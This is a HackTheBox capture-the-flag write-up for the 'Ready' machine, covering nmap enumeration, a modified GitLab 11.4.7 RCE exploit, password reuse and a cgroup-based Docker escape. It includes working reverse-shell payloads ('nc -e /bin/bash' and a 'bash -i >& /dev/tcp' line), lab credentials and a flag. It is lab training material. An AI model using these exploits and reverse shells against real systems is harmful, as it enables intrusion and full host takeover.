+++
title = 'Ready '
date = '2021-05-15T20:57:00Z'
author = 's4ch'
description = 'Ready HackTheBox writeup'
summary = 'Ready  is a HackTheBox machine writeup featuring penetration testing techniques and security assessment.'
slug = 'ready'
draft = false

categories = [
    'writeups'
]
series = [
    'HackTheBox'
]
tags = [
    'ctf',
    'hackthebox',
    'penetration-testing',
    'writeup',
    'linux',
    'medium'
]

# Machine Information
difficulty = 'Medium'
platform = 'HackTheBox'
os = 'Linux'
points = '20'
release_date = '2021-05-15T20:57:00Z'

[cover]
    image = "/writeups/hackthebox/ready/ready.png"
    alt = "Ready HackTheBox Machine"
    caption = "Ready - Medium Linux Machine"
    relative = false

# Show specific elements
ShowReadingTime = true
ShowWordCount = true
showtoc = true
tocopen = false
+++
# Information

- **Name:** Ready
- **Profile:** [www.hackthebox.eu](https://app.hackthebox.eu/machines/304)
- **Difficulty:** Medium
- **OS:** Linux
- **Points:** 30

## Overview

Install tools used in this WU on BlackArch Linux:

```
$ sudo pacman -S nmap exploit-db pwncat
```

## Network enumeration

Port and service scan with nmap:

```
# Nmap 7.91 scan initiated Fri Feb  5 18:56:03 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.220
Nmap scan report for 10.10.10.220
Host is up (0.030s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile
| /dashboard /projects/new /groups/new /groups/*/edit /users /help
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  5 18:56:34 2021 -- 1 IP address (1 host up) scanned in 30.44 seconds
```

## Web discovery

We have a Gitlab server at http://10.10.10.220:5080

We can register and once authenticated at http://10.10.10.220:5080/help
we can find the version is 11.4.7.

`searchsploit gitlab 11.4.7` shows us 3 RCE.

Exploring for public projects at http://10.10.10.220:5080/explore/projects
we can see `dude/ready-channel`.

## Web exploitation

All the exploits are dirty and broken so I picked the first and had to modify it:

```plaintext
$ searchsploit -p 49334.py
  Exploit: GitLab 11.4.7 - RCE (Authenticated)
      URL: https://www.exploit-db.com/exploits/49334
     Path: /usr/share/exploitdb/exploits/ruby/webapps/49334.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

$ cp /usr/share/exploitdb/exploits/ruby/webapps/49334.py .
```

`diff /usr/share/exploitdb/exploits/ruby/webapps/49334.py 49334.py`

```diff
22c22
< parser.add_argument('-P', help='reverse shell port', required=True)
---
> parser.add_argument('-x', help='reverse shell port', required=True)
29c29
< local_port = args.p
---
> local_port = args.x
59c59
<     lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port}' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
---
>     lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|""" + f'nc {local_ip} {local_port}' + ' -e /bin/bash' + """ \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1608799993.1234567,\\"enqueued_at\\":1608799993.1234567}"
```

Then we can launch the exploit.

```plaintext
$ python 49334.py -u cyfun -p password -g http://10.10.10.220 -l 10.10.14.172 -x 9999
```

We receive the reverse shell on our listener:

```
$ pwncat -l 9999 -vv
INFO: Listening on :::9999 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.220:59942 (family 2/IPv4, TCP)
id
uid=998(git) gid=998(git) groups=998(git)
```

Let's find the flag:

```
$ find /home -name user.txt -type f
/home/dude/user.txt
```

## Privilege Escalation of Machine : from git to root

We are in a docker container:

```plaintext
git@gitlab:~$ ls -lh /.dockerenv
-rwxr-xr-x 1 root root 0 Dec  1 12:41 /.dockerenv
```

There is the password of root (container).

```
git@gitlab:~$ cat /root_pass
YG65407Bjqvv9A0a8Tm_7w
```
In `/var/backup` there is a `docker-compose.yml` explaining the origin of
`root_pass`.

```yml
version: '2.4'

services:
  web:
    image: 'gitlab/gitlab-ce:11.4.7-ce.0'
    restart: always
    hostname: 'gitlab.example.com'
    environment:
      GITLAB_OMNIBUS_CONFIG: |
        external_url 'http://172.19.0.2'
        redis['bind']='127.0.0.1'
        redis['port']=6379
        gitlab_rails['initial_root_password']=File.read('/root_pass')
    networks:
      gitlab:
        ipv4_address: 172.19.0.2
    ports:
      - '5080:80'
      #- '127.0.0.1:5080:80'
      #- '127.0.0.1:50443:443'
      #- '127.0.0.1:5022:22'
    volumes:
      - './srv/gitlab/config:/etc/gitlab'
      - './srv/gitlab/logs:/var/log/gitlab'
      - './srv/gitlab/data:/var/opt/gitlab'
      - './root_pass:/root_pass'
    privileged: true
    restart: unless-stopped
    #mem_limit: 1024m

networks:
  gitlab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.19.0.0/16
```

There is a password in gitlab config:

```
git@gitlab:/opt/backup$ grep -v '^#' gitlab.rb | tr -d '\n' && echo
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

Then we can try password reuse on the root account.

```
git@gitlab:/opt/backup$ su root
Password:
root@gitlab:/opt/backup# cd
root@gitlab:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Now we have to escape from the container.

I used the second PoC from [HackTricks - Docker breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#i-own-root)

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.172/8888 0>&1" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

And received the reverse shell:

```plaintext
$ pwncat -l 8888 -vv
INFO: Listening on :::8888 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.220:34958 (family 2/IPv4, TCP)
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@ready:/# id
uid=0(root) gid=0(root) groups=0(root)
root@ready:/# cat /root/root.txt
b7f98681505cd39066f67147b103c2b3
```
